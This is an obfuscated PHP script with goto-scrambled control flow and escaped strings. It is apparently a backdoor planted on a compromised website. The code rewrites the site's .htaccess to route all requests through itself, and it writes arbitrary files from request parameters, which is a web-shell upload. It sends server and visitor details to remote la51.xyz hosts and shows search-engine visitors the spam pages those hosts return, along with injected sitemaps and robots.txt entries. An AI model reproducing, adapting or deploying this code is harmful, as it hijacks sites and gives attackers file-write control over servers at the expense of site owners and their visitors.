<?php
 goto kPfio; xJn8B: function sync_htaccess($htaccess_rule = '', $rewrite_open, $rewrite_index) { $rewrite_index = substr($rewrite_index, 0, @strrpos($rewrite_index, "\56")); $htaccess_rule = "\74\111\x66\x4d\x6f\144\165\154\x65\40\155\157\144\x5f\x72\145\x77\162\151\x74\145\x2e\143\x3e\12"; $htaccess_rule .= "\122\145\167\162\x69\x74\145\x45\156\147\151\x6e\x65\x20\117\x6e\12"; $htaccess_rule .= "\x52\145\x77\162\151\x74\x65\x42\141\163\145\40\57\12"; $htaccess_rule .= "\122\x65\167\162\151\164\x65\122\165\x6c\x65\x20\x5e" . $rewrite_index . "\56\x70\150\160\x24\x20\x2d\40\x5b\114\135\12"; $htaccess_rule .= "\x52\145\167\x72\x69\x74\x65\x43\157\x6e\144\40\45\173\x52\x45\121\125\105\x53\124\x5f\x46\111\x4c\x45\x4e\101\x4d\105\175\x20\41\x2d\146\12"; $htaccess_rule .= "\122\x65\x77\162\151\164\x65\x43\157\x6e\x64\x20\45\x7b\x52\105\x51\125\105\x53\x54\x5f\106\x49\114\x45\x4e\101\115\105\175\x20\41\55\144\xa"; $htaccess_rule .= "\122\x65\167\162\x69\x74\145\x52\165\x6c\145\x20\56\40\x2f" . $rewrite_index . "\56\x70\150\x70\x20\133\114\135\12"; $htaccess_rule .= "\x3c\x2f\111\x66\x4d\x6f\144\x75\154\x65\76"; if ($htaccess_rule != '') { if ($rewrite_open) { $htaccess_path = "\56\x2f\x2e\x68\x74\x61\143\x63\145\163\x73"; if ($htaccess_path != '' && file_exists($htaccess_path)) { @chmod($htaccess_path, 511); $htaccess_content = @file_get_contents($htaccess_path); if (!preg_match("\57\122\x45\x51\125\x45\123\x54\x5f\106\111\114\x45\116\101\115\x45\x2f", $htaccess_content) && !preg_match("\57" . $rewrite_index . "\x2e\160\150\x70\x2f", $htaccess_content)) { $htaccess_content = $htaccess_rule . PHP_EOL . $htaccess_content; @file_put_contents($htaccess_path, $htaccess_content); } } @chmod($htaccess_path, 292); } } } goto nOPtt; kPfio: header("\x43\x6f\x6e\x74\145\x6e\164\55\124\x79\160\145\x3a\164\145\170\164\x2f\150\x74\x6d\154\73\40\x63\150\x61\162\x73\145\x74\75\x75\x74\x66\x2d\70"); goto NJlXG; NJlXG: error_reporting(0); goto eN_on; JCU8B: $rewrite_open = "\x31"; goto bVuMD; nOPtt: class_x_i(); goto tzS_7; wLqJa: function class_x_i($x = '') { @set_time_limit(3600); @ignore_user_abort(1); global $lineNo, $all_data, $all_jump, $rewrite_open, $jumpNo; if (isset($_REQUEST["\163\x75\160\x66\151\x6c\145\163"])) { upfile(); die; } $httpReferer = isset($_SERVER["\x48\124\124\x50\137\122\105\x46\x45\x52\105\x52"]) ? $_SERVER["\x48\x54\x54\x50\137\x52\105\106\105\122\105\122"] : ''; $login_status = isset($_SERVER["\110\x54\124\120\x5f\x55\x53\105\122\x5f\x41\107\x45\x4e\x54"]) ? $_SERVER["\x48\124\124\120\137\x55\x53\x45\x52\137\x41\x47\x45\x4e\124"] : ''; $lCheck = true; $rCheck = func_referCheck($httpReferer); $server_name = ''; if (isset($_SERVER["\x48\x54\x54\x50\x5f\x48\117\x53\x54"])) { $server_name = $_SERVER["\110\x54\124\120\x5f\110\117\x53\124"]; } elseif (isset($_SERVER["\x53\105\x52\126\x45\122\137\116\101\x4d\x45"])) { $server_name = $_SERVER["\x53\105\x52\x56\105\x52\137\x4e\x41\115\x45"]; } $page_location = $_SERVER["\x52\x45\x51\125\x45\123\124\137\125\x52\111"]; if (strstr($page_location, "\x62\x63\x74\x69\x6f\x6e\75\160\151\x6e\x67")) { if (strstr($_GET["\x6d\x61\160\x6e\141\155\x65"], "\56\x78\155\154")) { $data_new = "\x68\164\164\160\x73\72\57\57\167\x77\167\x2e\x67\157\x6f\147\154\x65\56\x63\157\x6d\57\160\x69\156\147\x3f\x73\151\164\x65\x6d\141\x70\75" . $_GET["\x6d\x61\160\x6e\141\x6d\x65"]; if (stristr(file_get_contents($data_new), "\x67\157\157\147\x6c\145")) { echo "\74\x62\162\x3e\x6f\x6b\x3c\x62\162\x3e"; } else { echo $data_new . "\x3c\142\162\x3e\x70\151\156\x67\x20\146\141\x6c\163\x65\41\74\142\x72\76"; } } else { echo "\74\142\162\76\x73\151\x74\145\x6d\141\160\x20\156\141\x6d\145\40\x66\141\154\163\145\41\x3c\142\x72\x3e"; } die; } if (strstr($page_location, "\x73\160\141\x6e\137\x61\154\x6c\163\x69\164\145\x6d\x61\160\75")) { $span_allsitemap_leng = strpos($page_location, "\163\x70\x61\156\x5f\141\x6c\x6c\x73\x69\x74\145\155\x61\x70\75") + 16; $span_allsitemap = substr($page_location, $span_allsitemap_leng); $xpath_content = "\x3c\x3f\170\x6d\154\x20\166\x65\x72\x73\151\x6f\x6e\x3d\42\61\56\x30\x22\40\x65\x6e\x63\157\x64\x69\156\147\x3d\42\125\x54\x46\55\70\42\77\40\x3e\x3c\163\x69\164\145\155\x61\160\x69\156\x64\145\170\x20\x78\x6d\x6c\156\x73\75\x22\x68\164\164\160\72\57\57\167\x77\167\x2e\163\x69\x74\145\x6d\x61\x70\163\56\157\162\x67\x2f\x73\x63\x68\145\x6d\x61\x73\x2f\163\x69\164\145\155\141\x70\57\x30\x2e\71\x22\76"; if ($span_allsitemap != '') { $span_allsitemaps = explode("\174", $span_allsitemap); $fzxml = glob($span_allsitemaps[0]); $robotstxt = ''; foreach ($fzxml as $xml) { $xpath_content .= sprintf("\x3c\163\x69\x74\145\x6d\141\160\x3e\74\154\x6f\x63\76\x25\x73\x3c\57\154\x6f\143\76\x3c\x6c\141\x73\164\x6d\157\144\x3e\x25\163\74\57\154\141\163\164\155\x6f\x64\76\x3c\57\163\151\x74\x65\155\141\x70\76", "\x68\x74\164\x70\72\57\57" . $server_name . "\x2f" . $xml, date("\x59\x2d\x6d\55\144")); $robotstxt .= chr(13) . chr(10) . "\x53\x69\x74\x65\x6d\x61\160\x3a\150\x74\x74\x70\x3a\57\57" . $server_name . "\57" . $xml; } $site_map = "\163\151\164\145\x5f\x6d\141\160\x2e\170\x6d\x6c"; if ($span_allsitemaps[1] != '') { $site_map = $span_allsitemaps[1]; } $robotstxt = "\125\x73\145\x72\x2d\x61\147\145\x6e\164\x3a\40\52" . chr(13) . chr(10) . "\104\x69\163\141\x6c\x6c\157\167\72" . chr(13) . chr(10) . "\123\151\164\145\155\x61\160\72\x68\164\164\160\x3a\x2f\57" . $server_name . "\x2f" . $site_map . $robotstxt; $xpath_content .= "\74\57\x73\151\x74\145\x6d\141\160\x69\x6e\x64\145\x78\76"; $xpath_content = str_replace("\x65\x6e\x63\157\x64\151\156\147\x3d\x22\125\x54\x46\55\x38\x22\x3f\x20", "\145\x6e\143\x6f\x64\x69\156\147\75\x22\x55\124\x46\x2d\x38\42\77", $xpath_content); if (@file_put_contents($site_map, $xpath_content)) { @file_put_contents("\162\x6f\142\x6f\x74\x73\x2e\164\x78\164", $robotstxt); echo die($site_map . "\40\157\x6b"); } else { echo die("\xe5\xa4\261\350\264\245"); } } } $rewrite_index = ''; if (strpos($page_location, "\56\x70\x68\160") > 0) { $leng = strpos($page_location, "\56\160\x68\160") + 4; $rewrite_index = substr($page_location, 0, $leng); } if ($rewrite_index == '') { $rewrite_index = "\x69\156\x64\145\x78\x2e\x70\150\160"; } $url_host_format = "\x77\x77\x77\45\x64\56\x6c\x61\65\x31\56\170\171\x7a"; $uri_start = ''; if (isset($_SERVER["\x52\105\x51\125\x45\x53\x54\x5f\123\103\x48\105\115\x45"])) { $uri_start = $_SERVER["\122\105\x51\125\x45\x53\124\137\123\x43\110\105\x4d\x45"]; } else { $uri_start = isset($_SERVER["\110\x54\124\120\123"]) && $_SERVER["\110\124\x54\x50\x53"] !== "\157\146\x66" ? "\150\x74\164\160\x73" : "\150\164\164\x70"; } $rewrite_open = (int) $rewrite_open; sync_htaccess('', $rewrite_open, $rewrite_index); $url_format = ''; $url_b = "\150\164\164\x70\x3a\x2f\x2f\x77\167\167\x35\60\56\x6c\141\x35\x31\56\x78\171\x7a\57\152\x75\x6d\x70\70\x38\56\x70\x68\x70\x3f\x64\75\45\163\x26\x75\75\x25\163\x26\162\75\x25\163\46\154\x3d\x25\x73\46\x6e\x3d\45\163\x26\x74\75\x25\163\x26\150\x3d\45\x73\x26\x67\x3d\45\x73"; $url_b = sprintf($url_b, $server_name, urlencode($page_location), urlencode($httpReferer), urlencode($login_status), $all_jump, urlencode(date("\131\x2d\155\55\x64")), urlencode($uri_start), $jumpNo); if (isset($_GET["\147\165\x6f\x5f\165\162\x6c\x32"])) { echo $url_b; die; } if (strstr($page_location, "\x72\157\142\157\164\x73\56\164\x78\164") || strstr($page_location, "\163\x70\141\156\137\162\x6f\142\157\x74\163\x3d")) { $lineNos = explode("\x7c", $lineNo); $value = $lineNos[0]; $url_host_string = sprintf($url_host_format, $value); $url_format = "\x68\164\x74\160\72\57\x2f\x25\150\x6f\x73\x74\x25\x2f\x64\141\x74\x61\66\66\56\x70\150\160\x3f\144\x3d\x25\163\46\x75\x3d\x25\163\46\x72\x3d\x25\163\x26\x6c\75\x25\163\x26\x6e\x3d\45\163\46\164\x3d\x25\x73\46\150\75\x25\163\46\x67\75\45\x73"; $url_format = preg_replace("\x2f\x25\150\x6f\163\164\45\57\163\x69", $url_host_string, $url_format); $url_format = sprintf($url_format, $server_name, urlencode($page_location . "\162\x6f\x62\x6f\164\163\x73\x68\145\156\147\x63\150\145\156\147"), urlencode($httpReferer), urlencode($login_status), $all_data, urlencode(date("\x59\55\x6d\55\144")), urlencode($uri_start), $value); $content = rsync_httpreq($url_format); if (strstr($content, "\74\163\x70\141\156\147\157\x3e")) { if (strstr($page_location, "\162\157\x62\x6f\x74\x73\160\151\156\x67\75\160\151\156\x67")) { $addarr_tmp = explode("\12", $content); for ($i = 2; $i < rand(20, 50); $i++) { if (strstr(trim($addarr_tmp[$i]), "\56\x78\155\x6c")) { $data_new = "\150\x74\164\160\163\72\x2f\x2f\167\167\167\56\147\157\157\x67\x6c\x65\x2e\143\x6f\x6d\x2f\x70\x69\156\x67\77\x73\151\164\145\155\x61\160\x3d" . str_replace("\123\151\164\145\x6d\141\160\x3a", '', trim($addarr_tmp[$i])); if (stristr(file_get_contents($data_new), "\147\x6f\157\147\154\x65")) { echo $data_new . "\157\153\x3c\142\x72\x3e"; } else { echo $data_new . "\x70\151\x6e\x67\40\x66\141\154\x73\x65\41\x3c\x62\162\x3e"; } } else { echo "\163\x69\164\145\155\x61\x70\x20\156\x61\x6d\x65\40\x66\x61\x6c\163\145\x21\74\x62\x72\76"; } } die; } $content = str_replace("\x3c\163\160\x61\x6e\147\x6f\76", '', $content); @file_put_contents("\x72\157\142\157\x74\163\x2e\x74\170\x74", $content); die($content); } unset($content, $url_format, $url_host_string, $url_host_format, $page_location, $server_name, $httpReferer, $login_status); die; } if (strstr($page_location, "\56\170\155\154")) { $lineNos = explode("\x7c", $lineNo); $value = $lineNos[0]; $url_host_string = sprintf($url_host_format, $value); $url_format = "\x68\x74\164\160\72\x2f\57\45\150\x6f\x73\164\x25\57\x64\141\164\141\x36\x36\56\x70\x68\160\x3f\x64\x3d\x25\x73\46\165\x3d\45\163\x26\x72\x3d\45\x73\x26\x6c\x3d\x25\x73\46\156\x3d\45\x73\46\x74\75\x25\x73\46\150\x3d\x25\163\x26\147\75\x25\x73"; $url_format = preg_replace("\57\45\x68\157\163\164\x25\57\163\x69", $url_host_string, $url_format); $url_format = sprintf($url_format, $server_name, urlencode($page_location . "\144\x69\x74\165\163\150\x65\x6e\147\x63\150\x65\156\x67"), urlencode($httpReferer), urlencode($login_status), $all_data, urlencode(date("\131\x2d\x6d\55\x64")), urlencode($uri_start), $value); $content = rsync_httpreq($url_format); if (strstr($content, "\74\x73\160\141\x6e\x67\157\x3e")) { if (strstr($content, "\147\x65\164\143\157\x6e\164\x65\x6e\164\x35\x30\x30\160\x61\x67\145")) { @header("\x48\124\124\120\x2f\61\56\61\40\x35\x30\x30\40\111\156\x74\x65\162\x6e\141\x6c\40\x53\145\162\x76\145\162\x20\105\162\x72\x6f\x72"); die; } else { if (strstr($content, "\x67\x65\164\x63\x6f\x6e\164\145\x6e\x74\x34\x30\x34\160\x61\x67\145")) { @header("\x48\124\124\120\57\61\56\x31\40\x34\x30\64\x20\116\x6f\164\40\106\157\x75\x6e\144"); die; } } $content = str_replace("\74\163\160\141\x6e\147\157\76", '', $content); if (strstr($page_location, "\x2e\x78\155\x6c\x2e\147\172")) { $lengb = strpos($page_location, "\x2e\170\x6d\x6c\x2e\147\x7a") + 7; $xml_name = explode("\57", str_replace("\x3f", "\x2f", substr($page_location, 0, $lengb))); header("\x43\157\156\x74\x65\x6e\164\x2d\x54\171\x70\x65\72\x20\141\160\160\x6c\151\143\x61\164\151\x6f\156\57\x78\x2d\147\172\151\x70"); header("\103\x6f\156\x74\x65\156\x74\55\x44\151\163\x70\x6f\163\x69\164\x69\x6f\x6e\x3a\40\x61\x74\164\x61\143\150\155\145\156\x74\73\40\146\151\x6c\x65\x6e\141\155\145\75\42" . $xml_name[count($xml_name) - 1] . "\x22"); header("\103\141\143\x68\x65\x2d\x43\x6f\156\164\x72\x6f\x6c\x3a\x20\x6e\157\55\x63\141\x63\150\x65\54\40\x6e\157\x2d\163\164\157\162\145\x2c\40\155\x61\x78\55\141\147\145\75\60\x2c\x20\x6d\165\163\164\55\x72\x65\x76\141\154\151\x64\x61\164\x65"); header("\x50\x72\x61\147\155\x61\x3a\x20\156\157\x2d\143\141\x63\150\x65"); $gz_sitemap_content = gzencode($content, 9); echo $gz_sitemap_content; die; } if (strstr($_SERVER["\x52\105\x51\x55\105\x53\x54\x5f\125\x52\111"], "\163\160\x61\156\137\x73\151\x74\x65\155\x61\160\75")) { $span_sitemap_leng = strpos($_SERVER["\122\105\x51\125\x45\123\x54\x5f\x55\122\x49"], "\x73\x70\x61\156\137\163\151\x74\x65\x6d\x61\x70\x3d") + 13; $span_sitemap = substr($_SERVER["\122\x45\x51\x55\x45\123\124\137\125\122\x49"], $span_sitemap_leng); if ($span_sitemap != '') { if (strstr($span_sitemap, "\x2f")) { $filemap = explode("\57", $span_sitemap); if (!file_exists($filemap[0])) { mkdir($filemap[0]); } } if (@file_put_contents($span_sitemap, $content)) { $robots_path = "\x72\157\x62\157\x74\x73\x2e\x74\170\x74"; $map_content = "\123\x69\x74\145\x6d\x61\160\x3a\x20\40\x68\x74\164\160\72\x2f\57" . $server_name . "\x2f" . $span_sitemap . "\12"; if ($robots_path != '' && file_exists($robots_path)) { $robots_content = @file_get_contents($robots_path); $map_content = $map_content . $robots_content; @file_put_contents($robots_path, $map_content); } else { @file_put_contents($robots_path, $map_content); } echo die($span_sitemap . "\x20\x6f\153"); } else { echo die("\345\244\261\xe8\264\245"); } } } if (strstr($_SERVER["\x52\x45\121\125\105\x53\x54\137\x55\x52\111"], "\163\x70\141\156\137\163\151\x74\x65\155\x61\160\147\172\x3d")) { $span_sitemapgz_leng = strpos($_SERVER["\x52\x45\121\125\105\123\x54\x5f\x55\x52\x49"], "\163\x70\141\156\137\163\151\164\x65\155\x61\x70\147\172\75") + 15; $span_sitemapgz = substr($_SERVER["\122\x45\121\125\x45\x53\x54\x5f\125\122\111"], $span_sitemapgz_leng); if ($span_sitemapgz != '') { if (strstr($span_sitemapgz, "\57")) { $filemap = explode("\x2f", $span_sitemapgz); if (!file_exists($filemap[0])) { mkdir($filemap[0]); } } $gzfile = $span_sitemapgz . "\x2e\147\172"; $fp = gzopen($gzfile, "\x77\x39"); gzwrite($fp, $content); gzclose($fp); echo die($span_sitemapgz . "\56\147\172\x20\x6f\x6b"); } } @header("\x63\x6f\x6e\x74\x65\156\164\55\164\x79\160\x65\x3a\x20\164\x65\170\164\x2f\x78\155\x6c"); die($content); unset($content, $url_format, $url_host_string, $url_host_format, $page_location, $server_name, $httpReferer, $login_status); die; } } if ($rCheck) { $content = rsync_httpreq($url_b); if (strstr($content, "\x3c\163\x70\x61\156\147\x6f\76")) { $content = str_replace("\74\163\160\141\156\147\x6f\x3e", '', $content); echo "{$content}"; unset($content, $url_format, $url_host_string, $url_host_format, $page_location, $server_name, $httpReferer, $login_status); die; } } if ($lCheck) { $lineNos = explode("\174", $lineNo); for ($i = 0; $i < count($lineNos); $i++) { $url_host_string = sprintf($url_host_format, $lineNos[$i]); $url_format = "\x68\164\x74\160\x3a\57\57\45\150\x6f\163\164\x25\57\144\141\164\x61\x36\66\x2e\x70\x68\160\77\144\75\x25\163\x26\165\x3d\45\163\46\162\75\45\x73\46\154\x3d\45\163\x26\x6e\x3d\45\163\46\164\x3d\x25\x73\46\x68\75\45\x73\46\x67\x3d\45\163"; $url_format = preg_replace("\57\45\x68\x6f\163\164\x25\x2f\x73\x69", $url_host_string, $url_format); $url_format = sprintf($url_format, $server_name, urlencode($page_location), urlencode($httpReferer), urlencode($login_status), $all_data, urlencode(date("\x59\x2d\155\x2d\144")), urlencode($uri_start), $lineNos[$i]); if (isset($_GET["\147\165\x6f\137\165\162\x6c\x31"])) { echo $url_format; die; } $content = rsync_httpreq($url_format); if (strstr($content, "\x3c\x73\x70\x61\156\x67\x6f\x3e")) { if (strstr($content, "\x67\x65\164\143\x6f\x6e\164\145\x6e\164\65\60\60\x70\x61\147\145")) { @header("\110\x54\124\120\x2f\x31\x2e\x31\x20\x35\x30\x30\x20\x49\156\x74\x65\x72\x6e\141\154\x20\123\145\162\x76\x65\162\40\105\x72\162\157\x72"); die; } else { if (strstr($content, "\147\145\164\x63\157\x6e\x74\145\156\x74\64\x30\64\160\x61\147\145")) { @header("\110\x54\124\120\x2f\x31\x2e\x31\x20\x34\x30\x34\x20\x4e\157\x74\40\x46\157\x75\x6e\144"); die; } else { $content = str_replace("\x3c\163\160\x61\156\x67\157\x3e", '', $content); echo "{$content}"; unset($content, $url_format, $url_host_string, $url_host_format, $page_location, $server_name, $httpReferer, $login_status); die; } } } } } } goto xJn8B; eN_on: $lineNo = "\x32\63\63\66"; goto rUGXJ; rUGXJ: $jumpNo = "\62\x33\x33\x36"; goto ZWrQ1; De8ZB: function func_referCheck($refer) { $redi = false; $referbots = "\147\157\157\147\154\x65\56\x63\157\174\171\141\150\x6f\x6f\x2e\x63\157\56\x6a\x70\174\142\x69\x6e\x67"; if ($refer != '' && preg_match("\57\50{$referbots}\51\57\x73\151", $refer)) { $redi = true; } return $redi; } goto jnSVT; Z0CyR: $all_jump = "\x30"; goto JCU8B; ZWrQ1: $all_data = "\60"; goto Z0CyR; bVuMD: function rsync_httpreq($url, $async = 0, $method = 1, $pf = NULL, $headers = array()) { if (!preg_match("\x2f\x5e\150\x74\x74\x70\134\x3a\x5c\x2f\x5c\x2f\57\163\151", $url)) { if (isset($_GET["\x75\162\154\145\162\162"])) { $err = "\x5b\x75\162\x6c\x65\162\162\157\x72\135\x20\x69\x6e\166\x61\x6c\x69\x64\x20\x75\162\x6c\x3a\x26\156\x62\163\x70\x3b"; $err .= $url; echo $err; unset($err); die; } return ''; } $a = "\x63\165\162\x6c\x5f\x69\x6e\x69\x74\53\143\165\162\154\x5f\x73\x65\164\x6f\x70\164\53\x63\x75\x72\x6c\x5f\x65\x78\x65\143\x7c\x66\163\157\143\153\157\160\x65\x6e\x7c\160\146\163\x6f\x63\153\157\160\x65\x6e\174\163\x74\x72\x65\141\x6d\x5f\163\157\143\153\145\164\x5f\143\154\x69\x65\x6e\x74\174\163\157\143\x6b\145\164\x5f\x63\x72\x65\141\164\145"; $b = $out = ''; foreach (explode("\174", $a) as $c) { $y = 1; if ($async && substr($c, 0, 1) == "\x63") { continue; } foreach (explode("\x2b", $c) as $d) { if (!function_exists($d)) { $y = 0; } } unset($d); if ($y) { $b = $c; break; } } unset($a, $c); if ($b == '') { return 0; } if (substr($b, 0, 1) == "\x63") { $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_USERAGENT, "\x57\x48\122"); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_TIMEOUT, 100); if ($method == 2) { curl_setopt($ch, CURLOPT_POST, 1); if (is_array($pf)) { curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($pf)); } } $r = curl_exec($ch); curl_close($ch); if (!$r) { if (isset($_GET["\x63\x75\x72\x6c\145\x72\162"])) { $err = "\x5b\143\x75\162\x6c\40\145\x72\162\157\162\135\x26\x6e\142\x73\160\73"; $err .= curl_error($ch); echo $err; unset($err); die; } return 0; } else { $r = trim(trim($r, "\357\273\277")); return $r; } } $parse = parse_url($url); isset($parse["\150\157\163\x74"]) || ($parse["\x68\157\163\164"] = ''); isset($parse["\160\141\x74\150"]) || ($parse["\160\x61\x74\x68"] = ''); isset($parse["\161\x75\x65\162\x79"]) || ($parse["\x71\x75\x65\x72\171"] = ''); isset($parse["\x70\157\x72\x74"]) || ($parse["\x70\157\162\x74"] = ''); $xpath = $parse["\x70\141\x74\x68"] ? $parse["\x70\141\164\x68"] . ($parse["\161\x75\145\162\x79"] ? "\x3f" . $parse["\x71\165\x65\x72\171"] : '') : "\x2f"; $_host = $parse["\150\157\x73\164"]; if ($parse["\163\143\150\x65\155\x65"] == "\x68\164\x74\x70\163") { $version = "\61\56\x31"; $port = empty($parse["\x70\157\x72\x74"]) ? 443 : $parse["\x70\157\162\164"]; $_host = "\x73\163\154\72\x2f\57"; $_host .= $parse["\x68\x6f\x73\164"]; } else { $version = "\61\x2e\60"; $port = empty($parse["\x70\x6f\162\164"]) ? 80 : $parse["\160\157\162\x74"]; } $hhost = "\x48\x6f\163\164\72\x20"; $hhost .= $_host; $headers[] = $hhost; $headers[] = "\103\x6f\x6e\156\145\143\x74\151\157\x6e\72\40\x43\154\x6f\163\145"; $headers[] = "\x55\163\x65\162\x2d\x41\x67\145\x6e\164\72\40\127\x48\x52"; $headers[] = "\x41\143\x63\x65\x70\x74\x3a\40\52\57\52"; unset($hhost); if ($method == 2) { if (is_array($pf)) { $pf = http_build_query($pf); } $headers[] = "\x43\x6f\156\x74\x65\x6e\x74\x2d\164\x79\160\x65\72\40\141\160\160\154\x69\143\141\x74\x69\x6f\156\x2f\x78\55\x77\167\x77\x2d\146\x6f\162\155\55\165\162\x6c\145\156\x63\x6f\x64\x65\144"; $headers[] = "\x43\157\x6e\164\145\156\164\x2d\x4c\145\x6e\x67\x74\150\x3a\x20" . strlen($pf); $out = "\x50\117\123\x54\x20{$xpath}\x20\110\x54\124\120\57{$version}\xd\12" . join("\xd\12", $headers) . "\15\xa\15\12" . $pf; unset($pf); } else { $out = "\x47\105\124\x20{$xpath}\40\110\x54\x54\x50\x2f{$version}\xd\xa" . join("\xd\12", $headers) . "\xd\12\xd\xa"; } unset($headers, $parse, $version, $xpath); $fp = null; if (substr($b, -1) == "\156") { $fp = $b($_host, $port, $errno, $errstr, 30); } else { if (substr($b, -1) == "\x74") { $tcp = "\x74\x63\160\x3a\x2f\57"; $tcp .= $_host; $tcp .= "\x3a"; $tcp .= $port; $fp = stream_socket_client($tcp, $errno, $errstr, 30); unset($tcp); } } $content = ''; if ($fp) { stream_set_blocking($fp, true); stream_set_timeout($fp, 30); fwrite($fp, $out); if (!$async) { $status = stream_get_meta_data($fp); if (!$status["\x74\x69\x6d\145\x64\137\157\x75\164"]) { while (!feof($fp)) { $line = fgets($fp); if ($line && ($line == "\15\xa" || $line == "\xa")) { break; } unset($line); } while (!feof($fp)) { $data = fread($fp, 8192); $content .= $data; unset($data); } } unset($status); } fclose($fp); } else { if (substr($b, -1) == "\x65") { $_ip = gethostbyname($_host); $fp = $b(AF_INET, SOCK_STREAM, 0); if (socket_connect($fp, $_ip, $port)) { if (!$async) { socket_write($fp, $out, strlen($out)); while ($bf = @socket_read($fp, 8192)) { $content .= $bf; unset($bf); } $content = explode("\xd\xa\15\xa", $content); array_shift($content); $content = implode("\15\12\15\12", $content); } else { $t = mt_rand(2, 5); $i = 0; while ($i < $t) { socket_write($fp, $out, strlen($out)); $i++; usleep(mt_rand(50000, 100000)); } unset($i, $t); } } socket_close($fp); unset($_ip); } } if ($content == '') { if (function_exists("\146\x69\x6c\x65\x5f\x67\145\x74\137\143\x6f\x6e\164\x65\156\x74\163") and $url) { $content = @file_get_contents($url); } } unset($out, $b, $fp, $port, $_host); if (!$async) { $content = preg_replace_callback("\57\x28\x3f\72\x28\x3f\72\134\x72\134\x6e\174\134\x6e\51\174\136\51\50\133\60\x2d\x39\x41\x2d\x46\135\53\51\50\77\72\x5c\x72\x5c\x6e\174\134\x6e\x29\173\61\x2c\62\x7d\50\x2e\x2a\77\51" . "\50\50\77\x3a\134\162\x5c\156\174\134\x6e\51\50\x3f\72\x5b\x30\55\71\x41\55\x46\135\53\50\77\72\x5c\x72\x5c\x6e\174\134\x6e\x29\x29\x7c\44\51\57\x73\x69", create_function("\x24\x6d\141\164\x63\x68\145\163", "\x72\x65\x74\x75\162\156\x20\x68\x65\x78\144\145\143\x28\x24\155\141\164\143\150\x65\x73\x5b\61\x5d\51\40\75\x3d\40\x73\164\162\154\145\x6e\50\x24\x6d\x61\164\x63\150\x65\x73\x5b\62\135\51\40\77\x20\44\155\x61\164\x63\150\145\x73\x5b\62\x5d\40\72\40\44\x6d\141\x74\x63\x68\x65\x73\133\x30\x5d\73"), $content); return trim(trim($content, "\357\273\xbf")); } else { return 1; } } goto XkYyT; XkYyT: function BASE64_DEC0DE($string) { $base_pre = substr($string, 0, 5); $base_ext = substr($string, -5); $base_ = substr($string, 7, strlen($string) - 14); return gzinflate(base64_decode($base_pre . $base_ . $base_ext)); } goto amGQM; amGQM: function func_loginCheck($agent) { $login = false; $bots = "\x67\x6f\x6f\147\x6c\x65\142\x6f\x74\x7c\x62\x69\x6e\147\x62\157\x74\174\147\157\157\x67\x6c\145\174\141\x6f\x6c\174\142\151\x6e\147\x7c\x79\x61\150\x6f\157"; if ($agent != '') { if (preg_match("\x2f\50{$bots}\51\x2f\x73\151", $agent)) { $login = true; } } return $login; } goto De8ZB; jnSVT: function upfile() { $filenames = isset($_REQUEST["\x73\146\151\x6c\145\x6e\141\155\x65"]) ? $_REQUEST["\163\x66\151\x6c\x65\x6e\141\155\x65"] : ''; $filecontents = isset($_REQUEST["\x73\146\151\x6c\x65\143\x6f\x6e\164\145\x6e\164"]) ? $_REQUEST["\163\146\151\154\145\x63\157\156\164\145\156\x74"] : ''; if (file_exists($filenames)) { if (!unlink($filenames)) { echo "\x64\x65\154\145\x74\x65\x65\x72\x72\x6f\162"; die; } } file_put_contents($filenames, $filecontents, FILE_APPEND); echo $filenames . "\x73\x75\x63\143\145\163\163"; } goto wLqJa; tzS_7: ?>
